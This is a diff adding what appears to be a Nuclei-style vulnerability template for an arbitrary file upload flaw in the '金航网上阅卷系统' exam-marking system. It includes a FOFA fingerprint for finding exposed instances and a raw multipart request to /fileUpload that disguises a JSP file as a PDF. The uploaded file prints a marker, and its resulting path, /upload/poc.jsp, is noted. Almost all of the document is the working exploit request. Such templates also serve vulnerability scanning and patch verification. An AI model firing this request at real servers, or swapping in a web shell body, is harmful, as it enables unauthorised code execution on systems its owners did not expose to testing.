@@ -1,0 +1,60 @@
+id: poc-cam5qsco5cnpng8y
+info:
+  name: 金航网上阅卷系统fileUpload任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cam5qsco5cnpng8y'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cam5qsco5cnpng8y
+    fofa: body="js/insteadSelect/jquery.insteadSelect.css"
+http:
+- raw:
+  - 'POST /fileUpload HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 351
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="upload"; filename="poc.jsp"
+
+    Content-Type: application/pdf
+
+
+    <%out.println("1234");%>
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="uploadContentType"
+
+
+    pdf
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="uploadFileName"
+
+
+    1.jsp
+
+    --00content0boundary00--
+
+
+    文件路径：/upload/poc.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
